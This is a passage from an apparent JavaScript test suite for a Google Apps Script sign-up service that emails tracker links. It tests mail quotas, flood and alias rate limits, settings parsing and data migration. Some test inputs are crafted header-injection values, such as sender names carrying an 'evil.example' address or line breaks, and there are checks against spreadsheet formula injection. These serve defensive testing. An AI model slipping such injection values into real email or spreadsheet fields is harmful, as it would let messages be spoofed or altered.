  check('switch on, and the day\'s email used up: a new man still gets in', q.ok === true && KW.test(q.k) && q.mailed === false, q);
  check('his row has no emailed date, and the fault is written down without his address', !rowOf(w, 'late@example.com')[20] && w.errors.length === 1 && /link email not sent/.test(w.errors[0]) && w.errors[0].indexOf('late@') < 0, w.errors);
  check('every lock taken was released, none with a write waiting', w.locks === 0 && w.unflushed === 0);
}

/* 13. when the email cannot be sent */
{
  const w = makeWorld(); w.now = T0;
  w.post({ a: 'join', e: 'early@example.com' });                                 // sent while there was email to spare
  w.mail.quota = 0; minutes(w, 11);
  const r = w.post({ a: 'join', e: 'late@example.com' });
  check('with the day\'s email used up, a new man is told it did not send', r.ok === false && r.error === 'mail' && JSON.stringify(r).indexOf('kw_') < 0, r);
  check('his row is made all the same, with no emailed date', !!rowOf(w, 'late@example.com') && !rowOf(w, 'late@example.com')[20], rowOf(w, 'late@example.com'));
  check('and the fault is written down for Kevin, without the man\'s address', w.errors.length === 1 && /link email not sent/.test(w.errors[0]) && w.errors[0].indexOf('late@') < 0, w.errors);
  check('a man asking for a link he was sent before is told the same', w.post({ a: 'join', e: 'early@example.com' }).error === 'mail');
  w.mail.quota = 100;
  const t = w.post({ a: 'join', e: 'late@example.com' });
  check('once email is back, asking again sends it, with no ten-minute wait', JSON.stringify(t) === SENT && last(w).to === 'late@example.com' && codeIn(last(w)) === rowOf(w, 'late@example.com')[0] && rowOf(w, 'late@example.com')[20] instanceof Date, [t, w.mail.sent.length]);

  w.mail.fail = 'Invalid email: nothing@nowhere.example';
  const f = w.post({ a: 'join', e: 'other@example.com' });
  check('any fault while sending is treated the same way', f.error === 'mail' && !!rowOf(w, 'other@example.com') && w.mail.sent.length === 2, f);
  w.mail.fail = '';

  /* the last twenty of the day are kept for men who were sent a link before */
  const w2 = makeWorld(); w2.now = T0;
  w2.post({ a: 'join', e: 'oldhand@example.com' });
  w2.mail.quota = 21; minutes(w2, 11);
  check('with twenty-one emails left, a new man is still sent his link', JSON.stringify(w2.post({ a: 'join', e: 'n1@example.com' })) === SENT && w2.mail.quota === 20);
  const held = w2.post({ a: 'join', e: 'n2@example.com' });
  check('with twenty left, a new man is not: those are kept back', held.error === 'mail' && w2.mail.quota === 20 && !!rowOf(w2, 'n2@example.com') && !rowOf(w2, 'n2@example.com')[20], held);
  check('and trying again straight away does not get round it', w2.post({ a: 'join', e: 'n2@example.com' }).error === 'mail' && w2.mail.quota === 20);
  check('a man who was sent his link before still gets it from what was kept back', JSON.stringify(w2.post({ a: 'join', e: 'oldhand@example.com' })) === SENT && w2.mail.quota === 19 && last(w2).to === 'oldhand@example.com');
  w2.mail.quota = 100;
  check('next day the man who was held gets his', JSON.stringify(w2.post({ a: 'join', e: 'n2@example.com' })) === SENT && last(w2).to === 'n2@example.com' && codeIn(last(w2)) === rowOf(w2, 'n2@example.com')[0]);

  /* a hundred a day, twenty of them kept back */
  const w3 = makeWorld(); w3.now = T0;
  let sent = 0, held3 = 0;
  for (let i = 0; i < 120; i++) { if (i % 10 === 0) minutes(w3, 15); const x = w3.post({ a: 'join', e: 'day' + i + '@example.com' }); if (x.sent) sent++; else if (x.error === 'mail') held3++; }
  check('in one day eighty new men are emailed; the rest have a row and are told it did not send', sent === 80 && held3 === 40 && w3.mail.sent.length === 80 && w3.tab().getLastRow() === 121, [sent, held3, w3.mail.sent.length]);

  /* the script's memory failing after the email has gone */
  const w4 = makeWorld(); w4.now = T0; w4.cacheFail = 'm:';
  const c = w4.post({ a: 'join', e: 'cache@example.com' });
  check('if the tally cannot be written after the email has gone, he is still told it was sent', JSON.stringify(c) === SENT && w4.mail.sent.length === 1 && rowOf(w4, 'cache@example.com')[20] instanceof Date, c);
  check('every lock taken was released, none with a write waiting', [w, w2, w3, w4].every(x => x.locks === 0 && x.unflushed === 0));
}

/* 14. the Words tab */
{
  const w = makeWorld(); w.now = T0;
  w.post({ a: 'join', e: 'early@example.com' });
  check('with no Words tab at all: open, email only, the built-in words', last(w).subject === 'Kata Warrior Tracker' && !w.sheets.Words);
  w.gs.setup();
  const W = w.sheets.Words;
  const set = (name, text) => setWord(w, name, text);
  const fresh = (() => { let n = 0; return () => { minutes(w, 7); return 'w' + (n++) + '@example.com'; }; })();
  const send = () => { const e = fresh(); const r = w.post({ a: 'join', e: e }); return { e: e, r: r, m: last(w), k: rowOf(w, e) && rowOf(w, e)[0] }; };

  set('From name', 'Kevin Collins'); set('Email subject', 'Your tracker'); set('Email body', 'Line one.\nLine two.');
  let x = send();
  check('his own sender name, subject and body are used', x.m.to === x.e && x.m.name === 'Kevin Collins' && x.m.subject === 'Your tracker' && x.m.body === 'Line one.\nLine two.\n\n' + LINK + x.k, x.m);
  set('Email body', 'Before.\n{link}\nAfter.');
  x = send();
  check('{link} puts the link where he wants it, once', x.m.body === 'Before.\n' + LINK + x.k + '\nAfter.', x.m.body);
  set('Email body', '{link} and again {link}');
  x = send();
  check('written twice, it is filled in twice', x.m.body === LINK + x.k + ' and again ' + LINK + x.k);
  set('From name', ''); set('Email subject', '   '); set('Email body', '');
  x = send();
  check('an emptied cell goes back to the built-in word', x.m.name === 'Kata Warrior' && x.m.subject === 'Kata Warrior Tracker' && x.m.body === 'Build your own kata challenge and track it\n\n' + LINK + x.k, x.m);
  set('Email subject', 'Two\nlines'); set('From name', 'Kevin <kevin@evil.example>');
  x = send();
  check('a line break in the subject, or an address in the name, cannot bend the email', JSON.stringify(x.r) === SENT && x.m.subject === 'Two lines' && x.m.name === 'Kevin  kevin@evil.example ' && x.m.to === x.e, x.m);
  set('Email subject', ''); set('From name', '');
  set('Email body', 'x'.repeat(6000));
  x = send();
  check('a body far too long is cut, and the link still follows it', x.m.body.length === 5000 + 2 + LINK.length + 35 && x.m.body.endsWith(LINK + x.k));
  set('Email body', '');

  /* the Sign-ups switch: open only if it says open */
  const known = x.e, knownCode = x.k;
  for (const word of ['closed', 'Closed', ' CLOSED  ', 'close', 'off', 'no', 'stop', 'shut', 'opne', 'open?', 'yes']) {
    set('Sign-ups', word);
    const before = [w.tab().getLastRow(), w.mail.sent.length];
    minutes(w, 11);
    const a = w.post({ a: 'join', e: 'shut' + before[0] + '@example.com' }), b = w.post({ a: 'join', e: known });
    check('Sign-ups set to "' + word.trim() + '" turns away a new man and a man asking for his link, makes no row, sends nothing', a.error === 'closed' && b.error === 'closed' && w.tab().getLastRow() === before[0] && w.mail.sent.length === before[1], [a, b]);
  }
  check('while closed, a man with a link still loads and saves', w.post({ a: 'load', k: knownCode }).ok === true && w.post({ a: 'save', k: knownCode, rev: 0, data: state('One', 1), sum: { who: 'One' } }).rev === 1);
  check('a bad email is still called a bad email, closed or not', w.post({ a: 'join', e: 'nope' }).error === 'email');
  for (const word of ['open', 'OPEN', '  Open ', '']) {
    set('Sign-ups', word);
    check('Sign-ups set to "' + word + '" lets men in', JSON.stringify(send().r) === SENT);
  }

  /* the Open right away switch: on only if it says yes */
  for (const word of ['yes', 'YES', ' Yes ']) {
    set('Open right away', word);
    x = send();
    check('Open right away set to "' + word.trim() + '" hands a new man his code', x.r.ok === true && x.r.k === x.k && KW.test(x.k) && x.r.mailed === true && x.m.body.endsWith(LINK + x.k), x.r);
  }
  for (const word of ['no', 'No', '', 'y', 'yes please', 'on', 'true', 'maybe']) {
    set('Open right away', word);
    x = send();
    check('Open right away set to "' + word + '" does not: his link is only emailed', JSON.stringify(x.r) === SENT && x.m.to === x.e && x.m.body.endsWith(LINK + x.k), x.r);
  }

  /* Kevin rearranges or retypes the Words tab */
  set('Sign-ups', 'closed');
  W.rows.reverse(); W.rows.unshift(['My notes', 'ignore me', '']);
  W.rows.find(r => r[0] === 'Sign-ups')[0] = ' SIGN UPS: ';
  W.rows.find(r => r[0] === 'Email subject')[0] = 'email  subject';
  setWord(w, 'email  subject', 'Still found');
  minutes(w, 11);
  check('rows on the Words tab are found by name, wherever they sit and however the name is typed', w.post({ a: 'join', e: 'moved@example.com' }).error === 'closed');
  W.rows.find(r => r[0] === ' SIGN UPS: ')[1] = 'open';
  x = send();
  check('and the words beside them are used', JSON.stringify(x.r) === SENT && x.m.subject === 'Still found', x.m);
  W.rows.length = 0;
  x = send();
  check('an emptied Words tab means open, email only, the built-in words', JSON.stringify(x.r) === SENT && x.m.subject === 'Kata Warrior Tracker');
  check('nothing written could be read as a formula', w.hazards.length === 0, w.hazards);
  check('every lock taken was released, none with a write waiting', w.locks === 0 && w.unflushed === 0, [w.locks, w.unflushed]);
}

/* 15. floods */
{
  const w = makeWorld(); w.now = T0 - (T0 % 3600000);                          // the top of an hour
  let ok = 0, busy = 0;
  for (let i = 0; i < 100; i++) { const x = w.post({ a: 'join', e: 'flood' + i + '@example.com' }); if (x.sent) ok++; else if (x.error === 'busy') busy++; }
  check('a flood of new emails: ten a minute are taken, the rest told to wait', ok === 10 && busy === 90 && w.tab().getLastRow() === 11 && w.mail.sent.length === 10, [ok, busy, w.tab().getLastRow(), w.mail.sent.length]);
  check('a man who already has a row is not held up by the flood', JSON.stringify(w.post({ a: 'join', e: 'flood3@example.com' })) === SENT);
  minutes(w, 1);
  check('a minute later the door is open again', JSON.stringify(w.post({ a: 'join', e: 'patient@example.com' })) === SENT);
  w.mail.quota = 1e6; ok = 1 + 10;                                             // this hour so far
  for (let m = 0; m < 30; m++) { minutes(w, 1); for (let i = 0; i < 10; i++) { if (w.post({ a: 'join', e: 'h' + m + 'x' + i + '@example.com' }).ok) ok++; } }
  check('and sixty an hour is the most', ok === 60 && w.tab().getLastRow() === 61, [ok, w.tab().getLastRow()]);
  w.now += 3600000 - (w.now % 3600000);
  check('the next hour starts fresh', JSON.stringify(w.post({ a: 'join', e: 'nexthour@example.com' })) === SENT);

  const n = w.mail.sent.length;
  minutes(w, 11);
  for (let i = 0; i < 50; i++) w.post({ a: 'join', e: 'flood3@example.com' });
  check('fifty requests for one man\'s link send him one email', w.mail.sent.length === n + 1 && last(w).to === 'flood3@example.com', w.mail.sent.length - n);
  const longest = 'x'.repeat(64) + '@' + 'y'.repeat(43) + '.example.com';
  minutes(w, 1);
  check('the longest email allowed does not break the script\'s memory', longest.length === 120 && JSON.stringify(w.post({ a: 'join', e: longest })) === SENT && JSON.stringify(w.post({ a: 'join', e: longest })) === SENT && w.errors.length === 0, w.errors);
  check('an email one letter longer than that is refused', w.post({ a: 'join', e: 'x'.repeat(64) + '@' + 'y'.repeat(44) + '.example.com' }).error === 'email');

  /* one inbox, many spellings */
  const w2 = makeWorld(); w2.now = T0;
  const spell = ['victim@gmail.com', 'v.i.c.t.i.m@gmail.com', 'victim+1@gmail.com', 'Vic.Tim+2@GoogleMail.com', 'victim+3@gmail.com', 'vi.ctim+kata@gmail.com'];
  const got = spell.map(e => w2.post({ a: 'join', e: e }));
  check('one Gmail inbox under six spellings: three sign-ups are taken, the rest told to wait', got.filter(x => x.sent).length === 3 && got.filter(x => x.error === 'busy').length === 3 && w2.mail.sent.length === 3 && w2.tab().getLastRow() === 4, got);
  for (let i = 0; i < 20; i++) { minutes(w2, 11); spell.slice(0, 3).forEach(e => w2.post({ a: 'join', e: e })); }
  check('and asking again under every spelling, for hours, sends that inbox one more and no more', w2.mail.sent.length === 4, w2.mail.sent.length);
  check('each of those emails carried the link of the row it was sent for', w2.mail.sent.every(m => codeIn(m) === rowOf(w2, m.to)[0]));
  w2.now += 6 * 3600000 + 60000;
  check('six hours on, he can be sent his link again', JSON.stringify(w2.post({ a: 'join', e: 'victim@gmail.com' })) === SENT && w2.mail.sent.length === 5);
  const w3 = makeWorld(); w3.now = T0;
  const other = ['sam+1@example.com', 'sam+2@example.com', 'sam+3@example.com', 'sam+4@example.com', 's.am@example.com'].map(e => w3.post({ a: 'join', e: e }));
  check('elsewhere, name+anything is counted as one inbox, and a dot makes a different one', other.slice(0, 3).every(x => x.sent) && other[3].error === 'busy' && other[4].sent === true, other);
  check('every lock taken was released, none with a write waiting', [w, w2, w3].every(x => x.locks === 0 && x.unflushed === 0));
}

/* 16. Kevin tidying the sheet */
{
  const w = makeWorld(); w.now = T0;
  const men = ['a', 'b', 'c', 'd', 'e', 'f'].map(x => x + '@example.com');
  const code = {}; men.forEach(e => { w.post({ a: 'join', e: e }); code[e] = rowOf(w, e)[0]; });
  const t = w.tab();
  t.rows.splice(1, 0, ...t.rows.splice(4, 2));                                  // he re-sorts the sheet
  t.deleteRow(4);                                                              // and deletes a man
  const goneEmail = men.find(e => !rowOf(w, e));
  minutes(w, 11);
  const n = w.mail.sent.length;
  men.filter(e => e !== goneEmail).forEach(e => w.post({ a: 'join', e: e }));
  const sent = w.mail.sent.slice(n);
  check('after a re-sort and a deleted row, every man is sent his own link and no one else\'s', sent.length === 5 && sent.every(m => m.body.endsWith(LINK + code[m.to])), sent.map(m => [m.to, m.body.slice(-8)]));
  check('the emailed date lands on the right row each time', men.filter(e => e !== goneEmail).every(e => rowOf(w, e)[20].getTime() === w.now && rowOf(w, e)[0] === code[e]));

  check('a deleted man\'s link is dead for good', w.post({ a: 'load', k: code[goneEmail] }).error === 'code' && w.post({ a: 'save', k: code[goneEmail], rev: 0, data: state('x', 1), sum: {} }).error === 'code');
  const back = w.post({ a: 'join', e: goneEmail });
  check('if he signs up again he starts fresh, with a new link, emailed at once', JSON.stringify(back) === SENT && KW.test(rowOf(w, goneEmail)[0]) && rowOf(w, goneEmail)[0] !== code[goneEmail] && last(w).to === goneEmail && last(w).body.endsWith(LINK + rowOf(w, goneEmail)[0]), back);

  check('(the man deleted above was a@example.com)', goneEmail === 'a@example.com', goneEmail);
  rowOf(w, 'c@example.com')[1] = 'renamed@example.com';                        // he corrects a man's address by hand
  minutes(w, 11);
  check('a corrected address is sent the same link', JSON.stringify(w.post({ a: 'join', e: 'renamed@example.com' })) === SENT && last(w).to === 'renamed@example.com' && last(w).body.endsWith(LINK + code['c@example.com']));
  w.post({ a: 'join', e: 'c@example.com' });
  check('and the old address is a new man now', KW.test(rowOf(w, 'c@example.com')[0]) && rowOf(w, 'c@example.com')[0] !== code['c@example.com'] && last(w).to === 'c@example.com');

  /* the rows move at the worst possible moment: between finding a man's row and reading it */
  const moved = () => { t.rows.splice(1, 1); };                                // the first man's row is deleted, and everyone below moves up one
  const victim = 'f@example.com', vcode = code[victim];
  w.post({ a: 'save', k: vcode, rev: 0, data: state('F', 3), sum: { who: 'F', logged: 60, of: 500, lines: 1 } });
  const snapshot = () => JSON.stringify(t.rows.map(r => [r[0], r[1], r[2], r[3], r[8], r[10]]));
  minutes(w, 11);
  let before = t.rows.slice(); let mailsBefore = w.mail.sent.length;
  w.afterFind = moved;
  const j = w.post({ a: 'join', e: victim });
  check('rows moving while a man asks for his link: nothing is sent rather than the wrong link', j.ok === false && j.error === 'server' && w.mail.sent.length === mailsBefore, [j, w.mail.sent.length - mailsBefore]);
  t.rows = before.slice(); before = snapshot();
  w.afterFind = moved;
  const l = w.post({ a: 'load', k: vcode });
  check('rows moving while a count is loaded: no count is handed over rather than another man\'s', l.ok === false && l.error === 'server' && !l.data, l);
  t.rows = JSON.parse(JSON.stringify([])).concat(t.rows);                      // (rows are as the hook left them)
  const w2 = makeWorld(); w2.now = T0;
  ['p', 'q', 'r'].forEach(x => { w2.post({ a: 'join', e: x + '@example.com' }); });
  const t2 = w2.tab(); const qc = rowOf(w2, 'q@example.com')[0], rc = rowOf(w2, 'r@example.com')[0];
  w2.post({ a: 'save', k: rc, rev: 0, data: state('R', 2), sum: { who: 'R', logged: 40, of: 500, lines: 1 } });
  const was = JSON.stringify(t2.rows.slice(1).map(r => [r[0], r[2], r[3], r[8], r[10]]));
  w2.afterFind = () => { t2.rows.splice(1, 1); };                              // p's row goes; q moves into its place, r into q's
  const s = w2.post({ a: 'save', k: qc, rev: 0, data: state('Q', 9), sum: { who: 'Q', logged: 180, of: 500, lines: 1 } });
  const now = t2.rows.slice(1).map(r => [r[0], r[2], r[3], r[8], r[10]]);
  check('rows moving while a count is saved: nothing is written rather than writing over another man', s.ok === false && s.error === 'server' && JSON.stringify(now) === JSON.stringify(JSON.parse(was).slice(1)), [s, now.map(x => x.slice(0, 3))]);
  check('and the same save, sent again, lands on his own row', w2.post({ a: 'save', k: qc, rev: 0, data: state('Q', 9), sum: { who: 'Q', logged: 180, of: 500, lines: 1 } }).rev === 1 && rowOf(w2, 'q@example.com')[2] === 'Q' && rowOf(w2, 'r@example.com')[2] === 'R' && w2.post({ a: 'load', k: rc }).data === state('R', 2));
  check('nothing written could be read as a formula', w.hazards.length === 0 && w2.hazards.length === 0, [w.hazards, w2.hazards]);
  check('every lock taken was released, none with a write waiting', w.locks === 0 && w2.locks === 0 && w.unflushed === 0 && w2.unflushed === 0, [w.locks, w.unflushed]);
}

/* 17. the Sheet as it stands today: made by the first version of the script, with Kevin's test row in it */
{
  const path = require('path'), fs = require('fs');
  const v1 = path.join(__dirname, '..', 'backup-v1-paid', 'Code.gs');
  if (!fs.existsSync(v1)) { check('(the first version of the script is on hand to test against)', false, v1); }
  else {
    const old = makeWorld(v1); old.props.STRIPE_KEY_TEST = 'rk_test_good';
    old.gs.setup();
    const mine = 'cs_test_kevinFirstLookyAAAAbbbbCCCCdddd0000111122';
    old.tab().appendRow([mine, "test row: Kevin's first look", '', 0, 0, 0, new Date(), '', 0, 'https://katawarrior.com/tracker.html?k=' + mine, '']);
    old.stripe.sessions[A] = paid('Paid@Example.com'); old.post({ a: 'load', k: A });
    const count = state('Kevin', 12);
    old.post({ a: 'save', k: mine, rev: 0, data: count, sum: { who: 'Kevin', logged: 240, of: 500, lines: 1 } });
    check('(the old Sheet has no Link emailed column and no Words tab)', !old.tab().rows[0][20] && !old.sheets.Words && old.get().v === 1);

    const w = makeWorld(); w.sheets = old.sheets; w.now = T0;                   // the new script, on that same Sheet
    w.mail.denied = true;
    let threw = null; try { w.gs.setup(); } catch (e) { threw = e.message; }
    check('setup stops with plain words if Google was not allowed to send email', /^EMAIL IS NOT ALLOWED YET\. Run setup again and, when Google asks, tick every box/.test(threw || ''), threw);
    check('and leaves no test row behind when it stops', w.tab().getLastRow() === 3, w.tab().getLastRow());
    w.mail.denied = false;
    threw = null; try { w.gs.setup(); } catch (e) { threw = e.message; }
    check('setup runs clean on the Sheet as it stands', threw === null && w.logs.some(l => /SELF-TEST PASSED/.test(l)), [threw, w.logs]);
    check('it adds the Link emailed column and the Words tab', w.tab().rows[0][20] === 'Link emailed' && !!w.sheets.Words && w.sheets.Words.rows.length === 6);
    check('the old headings are untouched', w.tab().rows[0].slice(0, 11).join('|') === 'Code|Email|Name|Logged|Of|Lines|Started|Last saved|Saves|Link|Data');
    const row = w.tab().rows.find(r => r[0] === mine);
    check('Kevin\'s test row is untouched', !!row && row[1] === "test row: Kevin's first look" && row[2] === 'Kevin' && row[3] === 240 && row[8] === 1 && w.tab().getLastRow() === 3, row && row.slice(0, 10));
    check('his test link still loads the same count', w.post({ a: 'load', k: mine }).data === count && w.post({ a: 'load', k: mine }).rev === 1);
    check('and still saves', w.post({ a: 'save', k: mine, rev: 1, data: state('Kevin', 13), sum: { who: 'Kevin', logged: 260, of: 500, lines: 1 } }).rev === 2 && row[3] === 260);
    const j = w.post({ a: 'join', e: 'first@example.com' });
    check('the first real sign-up lands under the old rows', JSON.stringify(j) === SENT && w.tab().getLastRow() === 4 && w.tab().rows[3][1] === 'first@example.com' && KW.test(w.tab().rows[3][0]) && w.tab().rows[3][20] instanceof Date);
    check('the words in his test row\'s email cell are no one\'s address', w.post({ a: 'join', e: "test row: Kevin's first look" }).error === 'email');
    check('a paid row from the old script answers to its email', JSON.stringify(w.post({ a: 'join', e: 'paid@example.com' })) === SENT && last(w).body.endsWith(LINK + A));
    w.post({ a: 'join', e: 'selftest@example.com' });
    threw = null; try { w.gs.setup(); } catch (e) { threw = e.message; }
    check('a stranger signing up as selftest@example.com cannot make setup fail', threw === null, threw);
    check('nothing written could be read as a formula, by either version', w.hazards.length === 0 && old.hazards.length === 0, [w.hazards, old.hazards]);
    check('setup sent no email', w.mail.sent.filter(m => /self/i.test(m.to) && m.to !== 'selftest@example.com').length === 0 && w.mail.sent.length === 3, w.mail.sent.map(m => m.to));
    check('no lock was let go with a write still waiting', w.unflushed === 0 && w.locks === 0, [w.unflushed, w.locks]);
  }
}

/* 17b. the Words tab as it stands today: made by the sign-up version deployed on 5 Oct, five rows, no From address */
{
  const path = require('path'), fs = require('fs');
  const v2 = path.join(__dirname, '..', 'backup-v2-deployed', 'Code.gs');
  if (!fs.existsSync(v2)) { check('(the deployed sign-up version is on hand to test against)', false, v2); }
  else {
    const old = makeWorld(v2); old.now = T0;
    old.gs.setup();
    old.post({ a: 'join', e: 'early@example.com' });
    const W = old.sheets.Words;
    check('(the Words tab made by the deployed version has five rows and no From address)', W.rows.length === 5 && !W.rows.some(r => r[0] === 'From address') && old.get().v === 2);
    W.rows.find(r => r[0] === 'Email body')[1] = 'Kevin wrote this.';                 // he has started on his words
    W.rows.find(r => r[0] === 'Sign-ups')[0] = 'sign ups';                             // and retyped a label
    const before = JSON.stringify(W.rows);
    const earlyCode = old.tab().rows[1][0];

    const w = makeWorld(); w.sheets = old.sheets; w.now = T0 + 3600000;
    const j0 = w.post({ a: 'join', e: 'beforesetup@example.com' });
    check('before setup is run again, the new script works with the old tab: Google sends, his words kept', JSON.stringify(j0) === SENT && last(w).body.indexOf('Kevin wrote this.') === 0 && w.send.calls.length === 0, last(w));
    let threw = null; try { w.gs.setup(); } catch (e) { threw = e.message; }
    check('setup runs clean on it', threw === null && w.logs.some(l => /SELF-TEST PASSED/.test(l)), [threw, w.logs]);
    check('it adds the one missing row, From address, at the bottom, empty, with its note', W.rows.length === 6 && W.rows[5][0] === 'From address' && W.rows[5][1] === '' && /sending service/.test(W.rows[5][2]), W.rows[5]);
    check('and touches nothing that was there', JSON.stringify(W.rows.slice(0, 5)) === before, W.rows.slice(0, 5).map(r => r.slice(0, 2)));
    w.gs.setup();
    check('run again, it adds nothing more', W.rows.length === 6);
    check('a man from before still opens his count', w.post({ a: 'load', k: earlyCode }).ok === true);
    check('his retyped label still closes sign-ups when he says so', (() => { W.rows.find(r => r[0] === 'sign ups')[1] = 'closed'; minutes(w, 1); return w.post({ a: 'join', e: 'late@example.com' }).error === 'closed'; })());
    check('nothing written could be read as a formula; no lock let go with a write waiting', w.hazards.length === 0 && old.hazards.length === 0 && w.unflushed === 0 && w.locks === 0, [w.hazards, w.unflushed]);

    /* A2: the same old tab, but with its empty rows deleted, so there is no room below the last row */
    const tight = makeWorld(v2); tight.now = T0; tight.gs.setup();
    const w2 = makeWorld(); w2.sheets = tight.sheets; w2.now = T0 + 3600000;
    w2.sheets.Words.maxRows = 5;
    let threw2 = null; try { w2.gs.setup(); } catch (e) { threw2 = e.message; }
    check('on a Words tab with no empty row left, setup makes room for the missing row rather than stop', threw2 === null && w2.sheets.Words.rows.length === 6 && w2.sheets.Words.rows[5][0] === 'From address' && w2.sheets.Words.maxRows === 6 && w2.logs.some(l => /SELF-TEST PASSED/.test(l)), [threw2, w2.sheets.Words.maxRows]);

    /* A3: a Words tab Kevin has kept notes on, thirty-one rows deep */
    const deep = makeWorld(v2); deep.now = T0; deep.gs.setup();
    const w3 = makeWorld(); w3.sheets = deep.sheets; w3.now = T0 + 3600000;
    for (let r = 6; r <= 31; r++) w3.sheets.Words.getRange(r, 1).setValue('my note ' + r);
    w3.gs.setup();
    const at = w3.sheets.Words.rows.findIndex(r => r[0] === 'From address');
    check('(the missing row lands below his notes, at row 32)', at === 31, at);
    w3.sheets.Words.getRange(at + 1, 2).setValue('kevin@katawarrior.com'); w3.props.RESEND_KEY = 're_goodKey1234567890';
    const j3 = w3.post({ a: 'join', e: 'deep@example.com' });
    check('a From address that far down the tab is still read', JSON.stringify(j3) === SENT && w3.send.sent.length === 1 && w3.mail.sent.length === 0, [j3, w3.send.sent.length]);
  }
}

/* ==================================================================
   THE SENDING SERVICE: the link email sent as Kevin's own address
================================================================== */
const KEY = 're_goodKey1234567890';
const ME = 'kevin@katawarrior.com';
const withService = (w, addr) => { if (!w.sheets.Words) w.gs.setup(); setWord(w, 'From address', addr === undefined ? ME : addr); w.props.RESEND_KEY = KEY; };
const lastSend = w => w.send.sent[w.send.sent.length - 1];

/* 19. who sends */
{
  const w = makeWorld(); w.now = T0;
  w.gs.setup();
  w.post({ a: 'join', e: 'a1@example.com' });
  check('with no key and no From address, Google sends, and the service is never called', w.mail.sent.length === 1 && w.send.calls.length === 0 && w.fetched.length === 0, [w.mail.sent.length, w.fetched]);

  setWord(w, 'From address', ME); minutes(w, 1);
  w.post({ a: 'join', e: 'a2@example.com' });
  check('a From address alone changes nothing: with no key, Google still sends', w.mail.sent.length === 2 && w.send.calls.length === 0 && last(w).name === 'Kata Warrior');

  setWord(w, 'From address', ''); w.props.RESEND_KEY = KEY; minutes(w, 1);
  w.post({ a: 'join', e: 'a3@example.com' });
  check('a key alone changes nothing: with no From address, Google still sends', w.mail.sent.length === 3 && w.send.calls.length === 0);
  w.logs.length = 0; w.gs.setup();
  check('and setup says so, without showing the key', w.logs.some(l => l === 'Sender: still Google, from this account (97 more today). RESEND_KEY is in Script Properties, but the From address on the Words tab is empty.') && w.logs.join(' ').indexOf(KEY) < 0, w.logs);

  setWord(w, 'From address', ME); minutes(w, 1);
  const r = w.post({ a: 'join', e: 'Man.One@Example.com' });
  const row = rowOf(w, 'man.one@example.com'), c = w.send.calls[0], m = lastSend(w);
  check('with both in place, the service sends and the page is told the same as ever', JSON.stringify(r) === SENT && w.send.sent.length === 1 && w.send.calls.length === 1, r);
  check('Google sends nothing, and its allowance for the day is not touched', w.mail.sent.length === 3 && w.mail.quota === 97, [w.mail.sent.length, w.mail.quota]);
  check('the request is one POST of JSON to the service, the key in its header and nowhere else', c.url === 'https://api.resend.com/emails' && c.method === 'post' && c.type === 'application/json' && c.key === KEY && c.headers === 'Authorization' && c.mute === true && c.timeout === 15 && JSON.stringify(c.msg).indexOf(KEY) < 0, c);
  check('it carries four things: who from, the one man it is to, the subject, the words', Object.keys(c.msg).sort().join() === 'from,subject,text,to' && JSON.stringify(c.msg.to) === '["man.one@example.com"]', c.msg);
  check('it comes from Kevin\'s own address under the Kata Warrior name', m.from === 'Kata Warrior <' + ME + '>' && m.fromAddress === ME, m.from);
  check('its words are the same email as before: the line, then his link', m.subject === 'Kata Warrior Tracker' && m.body === 'Build your own kata challenge and track it\n\n' + LINK + row[0] && m.to === 'man.one@example.com', m);
  check('his row notes when it went, and the script keeps the day\'s tally', row[20] instanceof Date && w.props.MAIL_TALLY === '2026-10-05|1', [row[20], w.props.MAIL_TALLY]);
  w.logs.length = 0; w.gs.setup();
  check('setup says who the sender is and how many went today, without showing the key', w.logs.some(l => l === 'Sender: the sending service, as "Kata Warrior <' + ME + '>". Its key is in place. The first real sign-up is what proves it.') && w.logs.some(l => l === 'Sent through the service today by this script: 1.') && w.logs.join(' ').indexOf(KEY) < 0, w.logs);
  check('setup itself sends nothing, by either road', w.send.sent.length === 1 && w.mail.sent.length === 3);
  w.props.RESEND_KEY = 'Bearer ' + KEY; w.logs.length = 0; w.gs.setup();
  check('a key that does not start as the service\'s keys do is pointed out, still without showing it', w.logs.some(l => /^Sender: the sending service, as "Kata Warrior <kevin@katawarrior\.com>"\. Its key is in place, but does not start with re_ as its keys do: check it was pasted whole\. /.test(l)) && w.logs.join(' ').indexOf(KEY) < 0 && w.logs.join(' ').indexOf('goodKey') < 0, w.logs);
  w.props.RESEND_KEY = KEY;

  minutes(w, 11);
  const again = w.post({ a: 'join', e: 'man.one@example.com' });
  check('a man asking for his link again is sent the same link, by the service', JSON.stringify(again) === SENT && w.send.sent.length === 2 && lastSend(w).body === m.body && w.mail.sent.length === 3);
  w.post({ a: 'join', e: 'man.one@example.com' });
  check('and not twice within ten minutes', w.send.sent.length === 2);

  setWord(w, 'Email subject', 'Your tracker'); setWord(w, 'Email body', 'Kevin here.\n{link}\nKeep this.'); setWord(w, 'From name', 'Kevin Collins'); minutes(w, 1);
  w.post({ a: 'join', e: 'words@example.com' });
  check('his own name, subject and words go out through the service too', lastSend(w).from === 'Kevin Collins <' + ME + '>' && lastSend(w).subject === 'Your tracker' && lastSend(w).body === 'Kevin here.\n' + LINK + rowOf(w, 'words@example.com')[0] + '\nKeep this.', lastSend(w));
  for (const [name, want] of [['Collins, Kevin', 'Collins Kevin'], ['Kevin <evil@example.com>', 'Kevin evil example com'], ['"Kata" (Warrior); x:y', 'Kata Warrior x y'], ['O\'Brien\\Co [KW]', 'O\'Brien Co KW'], ['Dr. K. Collins', 'Dr K Collins'], ['kevin@katawarrior.com', 'kevin katawarrior com'], ['  ', 'Kata Warrior'], ['José カタ', 'José カタ']]) {
    setWord(w, 'From name', name); minutes(w, 1);
    const e = 'n' + w.send.sent.length + '@example.com';
    const x = w.post({ a: 'join', e: e });
    check('a From name of ' + JSON.stringify(name) + ' cannot bend the From line', JSON.stringify(x) === SENT && lastSend(w).from === want + ' <' + ME + '>' && lastSend(w).to === e, lastSend(w).from);
  }
  {
    const fancy = 'Kevin\u2019s tracker \u2014 \u201cbuild it\u201d. Caf\u00e9, \u7a7a\u624b, \ud83e\udd4b.\n{link}\nOss.';
    setWord(w, 'Email body', fancy); setWord(w, 'Email subject', 'Kevin\u2019s \ud83e\udd4b tracker'); setWord(w, 'From name', 'Jos\u00e9 \u30ab\u30bf'); minutes(w, 1);
    const r = w.post({ a: 'join', e: 'fancy@example.com' });
    const c = w.send.calls[w.send.calls.length - 1], m = lastSend(w);
